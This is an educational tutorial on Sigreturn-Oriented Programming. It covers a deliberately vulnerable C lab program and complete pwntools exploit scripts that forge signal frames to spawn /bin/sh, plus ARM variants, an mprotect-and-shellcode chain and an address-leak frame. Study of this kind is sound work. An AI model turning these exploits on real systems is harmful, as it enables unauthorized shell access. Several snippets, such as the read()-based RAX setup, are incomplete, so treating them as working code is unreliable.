# Sigreturn-Oriented Programming (SROP)

## Overview

**Sigreturn-Oriented Programming (SROP)** is an advanced ROP technique that exploits the `sigreturn` system call to gain complete control over all CPU registers with a single gadget. This is particularly powerful when traditional ROP gadgets are scarce.

---

## Signal Handling Background

### How Signals Work (Linux)

1. **Signal Delivery:** Kernel delivers signal to process (e.g., SIGSEGV, SIGINT)
2. **Context Save:** Kernel saves all registers to stack in a `sigcontext` structure
3. **Signal Handler:** Process executes signal handler
4. **Signal Return:** Process calls `sigreturn()` to restore registers and resume

### sigreturn System Call

**Purpose:** Restore CPU state after signal handler completes

**Mechanism:**
```c
// Kernel restores ALL registers from stack
struct sigcontext {
    unsigned long r8, r9, r10, r11, r12, r13, r14, r15;
    unsigned long rdi, rsi, rbp, rbx, rdx, rax, rcx, rsp;
    unsigned long rip;
    unsigned long eflags;
    unsigned short cs, gs, fs, __pad0;
    unsigned long err, trapno, oldmask, cr2;
    struct _fpstate *fpstate;
    unsigned long __reserved1[8];
};
```

**Key Insight:** Kernel trusts stack contents without validation!

---

## SROP Exploitation

### The Attack

1. **Control Stack:** Overflow to control stack contents
2. **Craft Fake Signal Frame:** Place fake `sigcontext` on stack
3. **Trigger sigreturn:** Execute `syscall` with RAX=15 (sigreturn)
4. **Kernel Restores Registers:** All registers set to attacker values!

### Why SROP is Powerful

**Traditional ROP:**
```python
# Need multiple gadgets to set registers
payload += p64(pop_rdi) + p64(arg1)  # Set RDI
payload += p64(pop_rsi_r15) + p64(arg2) + p64(0)  # Set RSI
payload += p64(pop_rdx) + p64(arg3)  # Set RDX
payload += p64(pop_rax) + p64(59)  # Set RAX
payload += p64(syscall)  # Execute
```

**SROP:**
```python
# Single gadget sets ALL registers!
payload += p64(syscall_gadget)  # sigreturn syscall
payload += fake_sigframe  # Kernel loads all registers from here
```

---

## Vulnerable Code Example

```c
// vuln_srop.c
#include <stdio.h>
#include <unistd.h>

void vulnerable() {
    char buffer[16];
    printf("Enter input: ");
    read(0, buffer, 1000);  // Massive overflow!
}

int main() {
    vulnerable();
    return 0;
}
```

**Compilation:**
```bash
# Compile with minimal gadgets (to demonstrate SROP necessity)
gcc -o vuln_srop vuln_srop.c -no-pie -fno-stack-protector -static
```

---

## SROP Exploitation (x64)

### Step 1: Find syscall Gadget

```bash
ROPgadget --binary vuln_srop --only "syscall"
# Output: 0x00401234 : syscall; ret
```

### Step 2: Craft Fake Signal Frame

```python
from pwn import *

context.arch = 'amd64'

# Create SigreturnFrame
frame = SigreturnFrame()

# Set registers for execve("/bin/sh", NULL, NULL)
frame.rax = 59  # execve syscall number
frame.rdi = binsh_addr  # "/bin/sh"
frame.rsi = 0  # NULL
frame.rdx = 0  # NULL
frame.rip = syscall_gadget  # Where to jump after sigreturn
frame.rsp = writable_addr  # Stack pointer (must be writable)

# Convert to bytes
fake_frame = bytes(frame)
```

### Step 3: Build Exploit

```python
#!/usr/bin/env python3
from pwn import *

binary = ELF('./vuln_srop')
context.arch = 'amd64'

p = process(binary.path)

# Find gadgets
syscall_gadget = 0x00401234  # syscall; ret

# Find "/bin/sh" string
binsh = next(binary.search(b'/bin/sh\x00'))

# Find writable memory (e.g., BSS)
writable = binary.bss()

# Build SROP frame
frame = SigreturnFrame()
frame.rax = 59  # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget
frame.rsp = writable + 0x100

# Build payload
offset = 24  # Offset to return address

payload = b"A" * offset

# First syscall: sigreturn (RAX must be 15)
payload += p64(syscall_gadget)  # Will execute sigreturn
payload += bytes(frame)  # Fake signal frame

# Send exploit
p.sendlineafter(b"Enter input: ", payload)
p.interactive()
```

### Memory Layout

```
Stack After Overflow:
┌─────────────────────────────────────┐
│  Overflow padding ("AAAA...")       │
├─────────────────────────────────────┤
│  syscall gadget address             │  ← Return address (RIP)
├─────────────────────────────────────┤
│  Fake Signal Frame:                 │
│  ┌─────────────────────────────┐    │
│  │ R8:  0x0000000000000000     │    │
│  │ R9:  0x0000000000000000     │    │
│  │ ...                         │    │
│  │ RDI: 0x00007ffff7a0d000     │    │  "/bin/sh"
│  │ RSI: 0x0000000000000000     │    │  NULL
│  │ RDX: 0x0000000000000000     │    │  NULL
│  │ RAX: 0x000000000000003B     │    │  59 (execve)
│  │ RIP: 0x0000000000401234     │    │  syscall gadget
│  │ RSP: 0x0000000000404100     │    │  Writable memory
│  │ ...                         │    │
│  └─────────────────────────────┘    │
└─────────────────────────────────────┘

Execution Flow:
1. Return to syscall gadget
2. RAX = 15 (sigreturn) - must be set beforehand!
3. Kernel reads signal frame from stack
4. Kernel restores ALL registers from frame
5. RIP = syscall gadget, RAX = 59, RDI = "/bin/sh"
6. Executes execve("/bin/sh", NULL, NULL)
```

---

## Setting RAX to 15

### Problem: RAX Must Be 15 for sigreturn

**Solutions:**

#### 1. Use read() Syscall

```python
# read() returns number of bytes read
# read(0, buffer, 15) → RAX = 15

payload = b"A" * offset
payload += p64(syscall_gadget)  # read(0, buffer, 15)
payload += b"B" * 15  # Send exactly 15 bytes → RAX = 15
payload += bytes(frame)  # Now sigreturn executes
```

#### 2. Use pop rax Gadget

```python
pop_rax = 0x00401XXX  # pop rax; ret

payload = b"A" * offset
payload += p64(pop_rax)
payload += p64(15)  # RAX = 15
payload += p64(syscall_gadget)  # sigreturn
payload += bytes(frame)
```

---

## ARM SROP

### ARM Signal Frame

```c
struct sigframe {
    struct ucontext uc;
    unsigned long retcode[2];
};

struct ucontext {
    unsigned long uc_flags;
    struct ucontext *uc_link;
    stack_t uc_stack;
    struct sigcontext uc_mcontext;
    sigset_t uc_sigmask;
};
```

### ARM Exploitation

```python
# ARM SROP (32-bit)
context.arch = 'arm'

frame = SigreturnFrame()
frame.r0 = binsh_addr  # 1st arg
frame.r1 = 0  # 2nd arg
frame.r2 = 0  # 3rd arg
frame.r7 = 11  # execve syscall number
frame.pc = syscall_gadget  # Where to jump
frame.sp = writable_addr

payload = b"A" * offset
payload += p32(syscall_gadget)  # svc 0 (syscall)
payload += bytes(frame)
```

---

## MIPS SROP

**Note:** MIPS SROP is less common due to different signal handling

```python
# MIPS signal frame structure varies by kernel version
# Generally less reliable than x86/ARM SROP
```

---

## Advanced SROP Techniques

### 1. SROP Chain

**Chain multiple sigreturn calls:**

```python
# Frame 1: Set up mprotect() to make stack executable
frame1 = SigreturnFrame()
frame1.rax = 10  # mprotect
frame1.rdi = stack_addr & ~0xfff  # Page-aligned address
frame1.rsi = 0x1000  # Size
frame1.rdx = 7  # PROT_READ | PROT_WRITE | PROT_EXEC
frame1.rip = syscall_gadget
frame1.rsp = stack_addr + 0x100

# Frame 2: Execute shellcode
frame2 = SigreturnFrame()
frame2.rip = shellcode_addr
frame2.rsp = stack_addr + 0x200

payload = p64(syscall_gadget) + bytes(frame1)
payload += p64(syscall_gadget) + bytes(frame2)
```

### 2. Blind SROP

**Exploit without binary (only syscall gadget address):**

```python
# Leak addresses via SROP
frame = SigreturnFrame()
frame.rax = 1  # write
frame.rdi = 1  # stdout
frame.rsi = got_addr  # Read from GOT
frame.rdx = 8  # 8 bytes
frame.rip = syscall_gadget
# ... leak libc addresses
```

---

## CTF Tips

### 1. When to Use SROP

**Use SROP when:**
- ✓ Very few ROP gadgets available
- ✓ Have syscall gadget
- ✓ Can control large stack area
- ✓ Need to set many registers at once

**Don't use SROP when:**
- ✗ Plenty of ROP gadgets available (traditional ROP is simpler)
- ✗ No syscall gadget
- ✗ Limited stack control

### 2. Debugging SROP

```bash
gdb ./vuln_srop
(gdb) break *syscall_gadget
(gdb) run < payload
(gdb) x/40gx $rsp  # Examine signal frame on stack
(gdb) info registers  # Check RAX (should be 15)
(gdb) si  # Step into sigreturn
(gdb) info registers  # Verify registers restored
```

### 3. Common Pitfalls

**Pitfall 1: RAX Not Set to 15**
```python
# Solution: Use read() or pop rax gadget
```

**Pitfall 2: Invalid RSP**
```python
# RSP must point to writable memory!
frame.rsp = binary.bss() + 0x100
```

**Pitfall 3: Misaligned Stack**
```python
# x64 requires 16-byte alignment
frame.rsp = (writable_addr + 0x100) & ~0xf
```

---

## Real-World Examples

### 1. CTF Challenge: "Smallest"

**Binary:** Only 3 gadgets (syscall, read, write)

**Solution:** SROP to execute arbitrary syscalls

### 2. Kernel Exploitation

**Use Case:** Kernel SROP for privilege escalation

```c
// Kernel signal frame manipulation
// Restore user registers with kernel privileges
```

---

## Further Reading

- [SROP Original Paper (Framing Signals)](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf)
- [Pwntools SigreturnFrame](https://docs.pwntools.com/en/stable/rop/srop.html)
- [SROP CTF Writeups](https://ctftime.org/writeups?tags=srop)

---

**Related:** [ROP](../ROP/) | [JOP](../JOP/)
